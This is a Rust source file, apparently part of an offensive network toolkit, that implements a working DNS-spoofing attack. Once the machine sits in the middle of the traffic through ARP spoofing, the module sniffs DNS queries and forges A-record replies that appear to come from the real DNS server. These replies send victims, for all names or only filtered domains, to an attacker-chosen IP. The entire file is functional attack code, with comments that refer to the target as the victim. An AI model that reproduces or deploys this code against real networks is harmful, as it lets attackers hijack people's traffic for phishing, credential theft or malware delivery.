//! DNS spoofing. While MITM (run `arp` in another shell), it watches UDP/53
//! queries flowing through and forges A-record replies — all names, or only
//! those matching a `--domain` filter — pointing at a chosen IP.

use std::net::Ipv4Addr;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Duration;

use pnet::datalink::{MacAddr, NetworkInterface};
use pnet::packet::ethernet::{EtherTypes, EthernetPacket, MutableEthernetPacket};
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::{checksum as ipv4_checksum, Ipv4Packet, MutableIpv4Packet};
use pnet::packet::udp::{ipv4_checksum as udp_checksum, MutableUdpPacket, UdpPacket};
use pnet::packet::Packet;

use crate::log::Logger;
use crate::net::{err, iface_ipv4, open_channel};

pub fn run(
    iface: &NetworkInterface,
    spoof_to: Option<Ipv4Addr>,
    domains: Vec<String>,
    logger: Logger,
    running: Arc<AtomicBool>,
) -> std::io::Result<()> {
    let src_mac = iface.mac.ok_or_else(|| err("interface has no MAC"))?;
    let spoof_ip = spoof_to
        .or_else(|| iface_ipv4(iface))
        .ok_or_else(|| err("no spoof IP (interface has no IPv4)"))?;
    let filt: Vec<String> = domains.iter().map(|d| d.to_ascii_lowercase()).collect();

    let (mut tx, mut rx) = open_channel(iface, Some(Duration::from_secs(1)))?;
    println!("DNS-spoofing all queries to {spoof_ip} on {}", iface.name);
    if !filt.is_empty() {
        println!("filter: {}", filt.join(", "));
    }
    println!("(be MITM first: run `arp` in another shell) — Ctrl+C to stop\n");

    while running.load(Ordering::SeqCst) {
        let Ok(frame) = rx.next() else { continue };
        let Some(eth) = EthernetPacket::new(frame) else { continue };
        if eth.get_ethertype() != EtherTypes::Ipv4 {
            continue;
        }
        let Some(ip) = Ipv4Packet::new(eth.payload()) else { continue };
        if ip.get_next_level_protocol() != IpNextHeaderProtocols::Udp {
            continue;
        }
        let Some(udp) = UdpPacket::new(ip.payload()) else { continue };
        if udp.get_destination() != 53 {
            continue;
        }
        let dns = udp.payload();
        if dns.len() < 13 || dns[2] & 0x80 != 0 {
            continue; // not a query
        }
        let Some(name) = qname(dns) else { continue };
        if !filt.is_empty() && !filt.iter().any(|d| name.to_ascii_lowercase().contains(d)) {
            continue;
        }
        let Some(answer) = build_dns_answer(dns, spoof_ip) else { continue };

        let frame = build_udp_frame(
            src_mac,
            eth.get_source(),       // back to the victim
            ip.get_destination(),   // from the real DNS server
            ip.get_source(),        // to the victim
            53,
            udp.get_source(),
            &answer,
        );
        tx.send_to(&frame, None);
        println!("[dns] {} -> {spoof_ip}  (asked by {})", name, ip.get_source());
        logger.event(
            "dns-spoof",
            &ip.get_source().to_string(),
            serde_json::json!({ "name": name, "answer": spoof_ip.to_string() }),
        );
    }
    Ok(())
}

fn qname(dns: &[u8]) -> Option<String> {
    let mut i = 12;
    let mut labels = Vec::new();
    while i < dns.len() {
        let len = dns[i] as usize;
        i += 1;
        if len == 0 {
            break;
        }
        if i + len > dns.len() {
            return None;
        }
        labels.push(String::from_utf8_lossy(&dns[i..i + len]).into_owned());
        i += len;
    }
    if labels.is_empty() {
        None
    } else {
        Some(labels.join("."))
    }
}

fn build_dns_answer(query: &[u8], spoof: Ipv4Addr) -> Option<Vec<u8>> {
    let mut i = 12;
    while i < query.len() {
        let len = query[i] as usize;
        i += 1;
        if len == 0 {
            break;
        }
        i += len;
        if i > query.len() {
            return None;
        }
    }
    let q_end = i + 4;
    if query.len() < q_end {
        return None;
    }
    let mut r = Vec::with_capacity(q_end + 16);
    r.extend_from_slice(&query[0..2]); // id
    r.extend_from_slice(&[0x81, 0x80]); // response, recursion available
    r.extend_from_slice(&[0x00, 0x01]); // QDCOUNT
    r.extend_from_slice(&[0x00, 0x01]); // ANCOUNT
    r.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
    r.extend_from_slice(&query[12..q_end]); // question
    r.extend_from_slice(&[0xc0, 0x0c, 0x00, 0x01, 0x00, 0x01]); // ptr, A, IN
    r.extend_from_slice(&[0x00, 0x00, 0x00, 0x3c]); // TTL 60
    r.extend_from_slice(&[0x00, 0x04]);
    r.extend_from_slice(&spoof.octets());
    Some(r)
}

#[allow(clippy::too_many_arguments)]
fn build_udp_frame(
    src_mac: MacAddr,
    dst_mac: MacAddr,
    src_ip: Ipv4Addr,
    dst_ip: Ipv4Addr,
    src_port: u16,
    dst_port: u16,
    payload: &[u8],
) -> Vec<u8> {
    let total = 14 + 20 + 8 + payload.len();
    let mut buf = vec![0u8; total];
    {
        let mut eth = MutableEthernetPacket::new(&mut buf[..14]).unwrap();
        eth.set_destination(dst_mac);
        eth.set_source(src_mac);
        eth.set_ethertype(EtherTypes::Ipv4);
    }
    {
        let mut ip = MutableIpv4Packet::new(&mut buf[14..34]).unwrap();
        ip.set_version(4);
        ip.set_header_length(5);
        ip.set_total_length((20 + 8 + payload.len()) as u16);
        ip.set_ttl(64);
        ip.set_next_level_protocol(IpNextHeaderProtocols::Udp);
        ip.set_source(src_ip);
        ip.set_destination(dst_ip);
        let c = ipv4_checksum(&ip.to_immutable());
        ip.set_checksum(c);
    }
    {
        let mut udp = MutableUdpPacket::new(&mut buf[34..]).unwrap();
        udp.set_source(src_port);
        udp.set_destination(dst_port);
        udp.set_length((8 + payload.len()) as u16);
        udp.set_payload(payload);
        let c = udp_checksum(&udp.to_immutable(), &src_ip, &dst_ip);
        udp.set_checksum(c);
    }
    buf
}
